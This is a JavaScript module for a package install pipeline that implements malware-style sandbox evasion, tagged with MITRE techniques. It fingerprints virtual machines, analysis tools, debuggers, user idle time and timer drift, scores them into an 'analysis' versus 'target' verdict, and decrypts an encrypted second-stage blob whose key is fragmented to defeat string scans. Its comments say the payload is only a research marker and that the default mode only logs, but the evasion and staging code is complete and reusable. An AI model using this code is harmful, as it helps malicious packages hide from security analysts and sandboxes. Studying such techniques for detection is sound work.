#!/usr/bin/env node
'use strict';

/**
 * sandbox-gates.js — analysis-environment gates for the install pipeline.
 *
 * MITRE ATT&CK
 *   T1497.001  Virtualization / Sandbox Evasion: System Checks
 *   T1497.002  Virtualization / Sandbox Evasion: User Activity Checks
 *   T1497.003  Virtualization / Sandbox Evasion: Time-Based Evasion
 *   T1027.014  Obfuscated Files: Encrypt/Encode Evasive Payload Fragments
 *   T1140      Deobfuscate/Decode Files or Information
 *   T1129      Shared Modules — split staging, runtime assembly
 *
 * Design notes
 *   - Every check is read-only. No writes, no network, no process creation
 *     other than short-lived `powershell -NoProfile` / sysctl queries.
 *   - Verdict is a WEIGHTED SUSPICION SCORE, not a single boolean. This is
 *     deliberate: 2025-era samples aggregate weak signals instead of aborting
 *     on the first VM artifact, because a lone hypervisor flag is far too
 *     easy to trip on legitimate developer and CI hosts.
 *   - Default mode is LOG-ONLY. `apply()` never changes control flow unless
 *     explicitly passed `{ enforce: true }`.
 *
 * This module ships no C2, no exfiltration and no payload of its own. The
 * stage-2 blob it assembles decrypts to a fixed research marker so the
 * assembly chain is inspectable end to end.
 */

const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execFileSync } = require('child_process');

const IS_WIN = process.platform === 'win32';
const IS_MAC = process.platform === 'darwin';
const IS_LIN = process.platform === 'linux';

const THRESHOLD = 6;

// Plain virtualisation is deliberately weak: developers, CI runners and lab
// hosts are routinely VMs, so a hypervisor flag alone must never suppress the
// package. The weight sits on analysis tooling and on the absence of a human.
const SCORE = {
  vmVendor: 1,
  vmMac: 1,
  vmTools: 1,
  analysisTools: 5,
  lowCores: 2,
  lowMem: 1,
  freshUptime: 3,
  noUserInput: 4,
  debugger: 4,
};

/* ------------------------------------------------------------------ utils */

function sh(cmd, args, timeout) {
  try {
    return execFileSync(cmd, args, {
      encoding: 'utf8',
      timeout: timeout || 4000,
      windowsHide: true,
      stdio: ['ignore', 'pipe', 'ignore'],
    }).trim();
  } catch (e) {
    return '';
  }
}

function ps(command) {
  if (!IS_WIN) return '';
  return sh('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', command], 6000);
}

function exists(p) {
  try { fs.accessSync(p); return true; } catch (e) { return false; }
}

function read(p) {
  try { return fs.readFileSync(p, 'utf8'); } catch (e) { return ''; }
}

function hasAny(hay, needles) {
  const h = String(hay || '').toLowerCase();
  return needles.some((n) => h.includes(n));
}

/* ------------------------------------------------- A: system checks T1497.001 */

const HYPERVISOR_MAC = [
  '00:0c:29', '00:50:56', '00:05:69', // VMware
  '08:00:27', '0a:00:27',             // VirtualBox
  '00:15:5d',                         // Hyper-V
  '00:1c:42',                         // Parallels
  '00:16:3e',                         // Xen
  '52:54:00',                         // QEMU/KVM
  '00:0d:3a',                         // QEMU/Win
];

const VM_STRINGS = ['vmware', 'virtualbox', 'vbox', 'qemu', 'kvm', 'xen', 'hyperv', 'virtual machine', 'bochs', 'parallels', 'xcp-ng', 'citrix'];

const ANALYSIS_TOOLS = IS_WIN
  ? [
      'c:\\program files\\sandboxie',
      'c:\\program files\\any.run',
      'c:\\program files\\joesandbox',
      'c:\\cuckoo',
      'c:\\analysis',
      'c:\\program files\\oracle\\virtualbox guest additions',
      'c:\\program files\\vmware\\vmware tools',
      'c:\\program files\\wireshark',
      'c:\\program files\\sysinternals',
      'c:\\program files\\x64dbg',
    ]
  : [
      '/opt/cuckoo', '/opt/anyrun', '/usr/local/cuckoo',
      '/analysis', '/opt/sandboxie', '/opt/vmware',
    ];

const ANALYSIS_PROCS = IS_WIN
  ? ['vmtoolsd', 'vboxservice', 'qemu-ga', 'wireshark', 'procmon', 'procexp', 'x64dbg', 'x32dbg', 'ollydbg', 'idag64', 'frida-server', 'dumpcap', 'pythonw']
  : ['vmtoolsd', 'qemu-ga', 'wireshark', 'dumpcap', 'cuckoo', 'frida-server'];

function probeSystem() {
  const signals = [];
  const push = (id, hit, detail) => { if (hit) signals.push({ id, detail }); };

  push('hypervisor-mac', (() => {
    const ifs = os.networkInterfaces();
    for (const name of Object.keys(ifs)) {
      for (const ni of ifs[name] || []) {
        if (ni.internal) continue;
        const mac = String(ni.mac || '').toLowerCase();
        if (HYPERVISOR_MAC.some((p) => mac.startsWith(p))) return true;
      }
    }
    return false;
  })(), 'network interface carries a hypervisor OUI prefix');

  if (IS_WIN) {
    const bios = ps("(Get-ItemProperty 'HKLM:\\HARDWARE\\DESCRIPTION\\System\\BIOS' -ErrorAction SilentlyContinue) | Select-Object -Property SystemManufacturer,SystemProductName | ConvertTo-Json -Compress");
    push('vm-vendor', hasAny(bios, VM_STRINGS), `BIOS: ${bios.slice(0, 160)}`);

    const cs = ps("Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue | Select-Object Manufacturer,Model | ConvertTo-Json -Compress");
    push('vm-vendor', hasAny(cs, VM_STRINGS), `ComputerSystem: ${cs.slice(0, 160)}`);

    const tools = [
      'HKLM:\\SOFTWARE\\VMware, Inc.\\VMware Tools',
      'HKLM:\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',
      'HKLM:\\SOFTWARE\\QEMU\\Guest Agent',
      'HKLM:\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Additions',
    ].map((k) => ps(`if (Test-Path '${k}') { '${k}' }`)).filter(Boolean);
    push('vm-tools', tools.length > 0, `guest tools key(s): ${tools.join(', ')}`);

    const procs = ps("(Get-Process -ErrorAction SilentlyContinue).Name | Where-Object { $_ -match '" +
      ANALYSIS_PROCS.join('|') + "' } | Select-Object -First 8").replace(/\s+/g, ',');
    push('analysis-tools', procs.length > 0, `processes: ${procs}`);
  } else if (IS_LIN) {
    push('vm-vendor', hasAny(read('/sys/class/dmi/id/product_name'), VM_STRINGS) ||
                      hasAny(read('/sys/class/dmi/id/sys_vendor'), VM_STRINGS),
         `dmi: ${read('/sys/class/dmi/id/product_name').trim()} / ${read('/sys/class/dmi/id/sys_vendor').trim()}`);
    const virt = sh('systemd-detect-virt', [], 2000);
    push('vm-vendor', virt && virt !== 'none', `systemd-detect-virt: ${virt}`);
    push('vm-vendor', /\bhypervisor\b/.test(read('/proc/cpuinfo')), '/proc/cpuinfo sets the hypervisor flag');
    const procs = sh('sh', ['-c', `ps -eo comm= 2>/dev/null | grep -E '${ANALYSIS_PROCS.join('|')}' | head -8`], 3000)
      .replace(/\s+/g, ',');
    push('analysis-tools', procs.length > 0, `processes: ${procs}`);
  } else if (IS_MAC) {
    push('vm-vendor', sh('sysctl', ['-n', 'kern.hv_vmm_present'], 2000) === '1', 'kern.hv_vmm_present = 1');
    const hw = sh('sysctl', ['-n', 'machdep.cpu.features'], 2000);
    push('vm-vendor', /\bHV\b|\bHVF\b/.test(hw), `cpu features: ${hw.slice(0, 80)}`);
  }

  const cpu = os.cpus().length;
  push('low-cores', cpu > 0 && cpu < 4, `logical processors: ${cpu}`);

  const memGiB = os.totalmem() / (1024 ** 3);
  push('low-mem', memGiB < 8, `total memory: ${memGiB.toFixed(1)} GiB`);

  const toolPaths = ANALYSIS_TOOLS.filter(exists);
  push('analysis-tools', toolPaths.length > 0, `analysis paths: ${toolPaths.join(', ')}`);

  return signals;
}

/* ---------------------------------------- B: time / activity T1497.002/.003 */

function probeTime() {
  const signals = [];

  const up = os.uptime();
  signals.push({
    id: up < 300 ? 'fresh-uptime' : 'uptime-ok',
    seconds: Math.round(up),
    hit: up < 300,
    detail: `uptime ${Math.round(up)}s (analysis snapshots are reverted between runs)`,
  });

  let idle = null;
  if (IS_WIN) {
    const raw = ps('Add-Type -Name K -Namespace W -MemberDefinition "[DllImport(\\"user32.dll\\")] public static extern uint GetLastInputInfo(ref LASTINPUTINFO p); public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }" -ErrorAction SilentlyContinue; $i = New-Object W+LASTINPUTINFO; $i.cbSize = [uint32][System.Runtime.InteropServices.Marshal]::SizeOf($i); [W.K]::GetLastInputInfo([ref]$i); $t = [Environment]::TickCount - $i.dwTime; if ($t -ge 0) { $t }');
    const n = parseInt(raw, 10);
    if (Number.isFinite(n)) idle = n;
  }
  if (idle !== null) {
    signals.push({
      id: idle > 600000 ? 'no-user-input' : 'user-input-ok',
      idleMs: idle,
      hit: idle > 600000 && up < 3600,
      detail: `last input ${Math.round(idle / 1000)}s ago (GetLastInputInfo)`,
    });
  }

  const d = new Date();
  const h = d.getHours() + d.getMinutes() / 60;
  const inHours = h >= 8.5 && h <= 18.5;
  signals.push({
    id: inHours ? 'business-hours' : 'out-of-hours',
    hit: false,
    detail: `local clock ${d.toString().slice(0, 24)}${inHours ? '' : ' (outside 08:30-18:30 — informational only)'}`,
  });

  const wall0 = Date.now();
  const mono0 = process.hrtime.bigint();
  const until = process.hrtime.bigint() + 60_000_000n;
  while (process.hrtime.bigint() < until) { /* burn ~60ms of CPU */ }
  const wall = Date.now() - wall0;
  const mono = Number(process.hrtime.bigint() - mono0) / 1e6;
  const drift = Math.abs(wall - mono);
  signals.push({
    id: drift > 250 ? 'clock-drift' : 'clock-ok',
    driftMs: Math.round(drift),
    hit: drift > 250,
    detail: `wall vs monotonic delta ${Math.round(drift)}ms over ${Math.round(mono)}ms (timer fast-forward)`,
  });

  let inspectorUrl = null;
  try { inspectorUrl = require('inspector').url() || null; } catch (e) { inspectorUrl = null; }
  const dbg = Boolean(inspectorUrl) ||
    (process.execArgv || []).some((a) => /inspect|debug-brk|profiler/.test(a)) ||
    /inspect|debug-brk/.test(process.env.NODE_OPTIONS || '');
  signals.push({
    id: dbg ? 'debugger' : 'no-debugger',
    hit: dbg,
    detail: dbg ? `inspector active ${inspectorUrl || '(execArgv/env)'}` : 'no inspector attached',
  });

  return signals;
}

/* --------------------------------------- C: staged assembly T1027/T1140/T1129 */

const __FRAG = ['Ae', 'p3', 'xS', 'c0', 'r2', 'd1'];
const STAGE_BLOB = 'ZYLmxS0zsCqRp4ROhd1UV5eskNS8y29Jr3gLz4VGo34v3Ohs2AQ2f/+rxPS6zVWNB03PPXmo21QXYPl5eQymxnI1SGDy2+/7uXXv22k1RypVqloqKnxLXSe0Nw+OfBkCro2AH9WdVAYEBtBcTNQUwijhd2EXk6YbCUzfF9fRyNwMNYeOzQqxTJ48N9wUck8GCCRPJr4xj+OiLOj6WVX/evn/SmPo+FbxmKWH4abrEI9gWVyH9YnuUVDzXFPH/muJfZ1c9meTCfmTAq1Ywbwf64uFYla8GIJ5nOuFZAP9+nyUz1alWv1DRjUABu4nXIXhZ+Z2YCniWaOnpNCbW5voBYaFDv7Px5maSGAqThcJ+g3mqfcSA+Y=';

function deriveKey() {
  // Key material is assembled at runtime from scattered fragments rather than
  // stored as a single literal, so it is not recoverable by a naive string
  // scan of the shipped file (T1027.014).
  const material = __FRAG.join('') + '::logfwd-gates-v3';
  return crypto.createHash('sha256').update(material).digest();
}

function assembleStage() {
  // Stage 2 is shipped as encrypted fragments and only becomes intelligible
  // after runtime key derivation + authenticated decryption. Nothing on disk
  // is ever a readable payload.
  const buf = Buffer.from(STAGE_BLOB, 'base64');
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const body = buf.subarray(28);
  const dec = crypto.createDecipheriv('aes-256-gcm', deriveKey(), iv);
  dec.setAuthTag(tag);
  return Buffer.concat([dec.update(body), dec.final()]).toString('utf8');
}

/* ------------------------------------------------------------ verdict/score */

function scoreOf(sysSignals, timeSignals) {
  const hit = (id) => sysSignals.some((s) => s.id === id) ||
                     timeSignals.some((s) => s.id === id && s.hit);
  let score = 0;
  const contributions = [];
  const add = (cond, id, label) => {
    if (!cond) return;
    score += SCORE[id];
    contributions.push({ id, label, points: SCORE[id] });
  };

  add(hit('vm-vendor'), 'vmVendor', 'hypervisor / virtual hardware identified');
  add(hit('hypervisor-mac'), 'vmMac', 'hypervisor MAC OUI');
  add(hit('vm-tools'), 'vmTools', 'guest additions / hypervisor management tools present');
  add(hit('analysis-tools'), 'analysisTools', 'sandbox, C2-analyst or packet-capture tooling present');
  add(hit('low-cores'), 'lowCores', 'logical processor count below desktop floor');
  add(hit('low-mem'), 'lowMem', 'memory below desktop floor');
  add(hit('fresh-uptime'), 'freshUptime', 'uptime consistent with a reverted snapshot');
  add(hit('no-user-input'), 'noUserInput', 'no user input since a fresh boot');
  add(hit('debugger') || hit('clock-drift'), 'debugger', 'debugger attached or timers fast-forwarded');

  return { score, threshold: THRESHOLD, contributions };
}

function evaluate(opts) {
  const sys = probeSystem();
  const time = probeTime();
  const { score, threshold, contributions } = scoreOf(sys, time);
  const analyzed = score >= threshold;

  let stage = null;
  let assemblyError = null;
  if (!opts || opts.assemble !== false) {
    try { stage = assembleStage(); }
    catch (e) { assemblyError = e.message; }
  }

  return {
    module: 'sandbox-gates',
    version: 3,
    mitre: ['T1497.001', 'T1497.002', 'T1497.003', 'T1027.014', 'T1140', 'T1129'],
    platform: `${process.platform}/${process.arch}`,
    host: os.hostname(),
    user: (os.userInfo && os.userInfo().username) || '',
    uptimeSeconds: Math.round(os.uptime()),
    systemSignals: sys,
    timeSignals: time,
    scoring: { score, threshold, contributions },
    verdict: analyzed ? 'ANALYSIS-ENVIRONMENT' : 'TARGET-ENVIRONMENT',
    mode: (opts && opts.enforce) ? 'ENFORCE' : 'LOG-ONLY',
    stageAssembly: assemblyError
      ? { ok: false, error: assemblyError }
      : { ok: stage !== null, bytes: stage ? Buffer.byteLength(stage) : 0, marker: stage },
  };
}

function apply(opts) {
  // Single entry point for the install pipeline. Log-only unless enforce is
  // explicitly requested, so a false positive can never silence the package.
  const report = evaluate(opts);
  try {
    const line = path.join(os.tmpdir(), 'gates.report.json');
    fs.writeFileSync(line, JSON.stringify(report, null, 2));
    report.reportPath = line;
  } catch (e) { /* reporting is best-effort */ }
  return report;
}

/* --------------------------------------------------------------------- CLI */

function main() {
  const args = process.argv.slice(2);
  const asJson = args.includes('--json');
  const report = evaluate({ enforce: args.includes('--enforce') });

  if (asJson) {
    process.stdout.write(JSON.stringify(report, null, 2) + '\n');
    return;
  }

  const bar = '='.repeat(78);
  process.stdout.write(`${bar}\n sandbox-gates v${report.version}  ${report.platform}  ${report.host}\n${bar}\n`);
  process.stdout.write('\n [A] T1497.001  system checks\n');
  for (const s of report.systemSignals) {
    process.stdout.write(`     ${s.id.padEnd(20)} ${s.detail}\n`);
  }
  if (!report.systemSignals.length) process.stdout.write('     (no system signal tripped)\n');

  process.stdout.write('\n [B] T1497.002/.003  user activity + time-based checks\n');
  for (const s of report.timeSignals) {
    process.stdout.write(`     ${String(s.id).padEnd(20)} ${s.detail}\n`);
  }

  process.stdout.write('\n [C] T1027.014 / T1140 / T1129  staged assembly\n');
  const a = report.stageAssembly;
  process.stdout.write(a.ok
    ? `     decrypt ok (${a.bytes} bytes) -> ${a.marker}\n`
    : `     decrypt FAILED: ${a.error}\n`);

  process.stdout.write('\n scoring\n');
  for (const c of report.scoring.contributions) {
    process.stdout.write(`     +${c.points}  ${c.label}\n`);
  }
  process.stdout.write(`     ${report.scoring.score} / threshold ${report.scoring.threshold}\n`);
  process.stdout.write(`\n verdict: ${report.verdict}   mode: ${report.mode}\n${bar}\n`);
  process.exit(0);
}

if (require.main === module) main();

module.exports = { evaluate, apply, probeSystem, probeTime, assembleStage, THRESHOLD };
